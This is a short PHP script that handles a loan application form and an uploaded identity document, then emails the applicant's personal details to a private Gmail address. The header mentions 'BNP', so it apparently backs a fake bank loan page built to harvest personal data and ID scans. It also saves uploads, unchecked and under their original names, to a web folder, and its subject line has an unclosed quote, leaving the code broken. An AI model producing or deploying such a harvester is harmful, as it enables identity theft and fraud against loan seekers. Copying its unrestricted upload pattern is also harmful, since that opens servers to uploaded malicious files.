<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $lastName = $_POST['lastName'];
    $firstName = $_POST['firstName'];
    $gender = $_POST['gender'];
    $country = $_POST['country'];
    $phonePrefix = $_POST['phonePrefix'];
    $phoneNumber = $_POST['phoneNumber'];
    $address = $_POST['address'];
    $profession = $_POST['profession'];
    $income = $_POST['income'];
    $loanReason = $_POST['loanReason'];
    $email = $_POST['email'];

    // Traitement du fichier de pièce d'identité
    $idDocument = $_FILES['idDocument'];
    $fileName = $idDocument['name'];
    $fileTmpName = $idDocument['tmp_name'];
    $filePath = "uploads/" . basename($fileName);
    move_uploaded_file($fileTmpName, $filePath);

    // Préparation de l'email
    $to = 'emmatechdesign@gmail.com';
    $subject = 'New Formulaire;
    $message = "
        Last Name: $lastName\n
        First Name: $firstName\n
        Gender: $gender\n
        Country: $country\n
        Phone: $phonePrefix $phoneNumber\n
        Address: $address\n
        Profession: $profession\n
        Income: $income\n
        Reason for Loan: $loanReason\n
        Email: $email\n
    ";

    // Envoi de l'email
    $headers = "From: no-reply@emmatd90.github.io/BNP/.com";
    if (mail($to, $subject, $message, $headers)) {
        echo "Success";
    } else {
        echo "Error";
    }
}
?>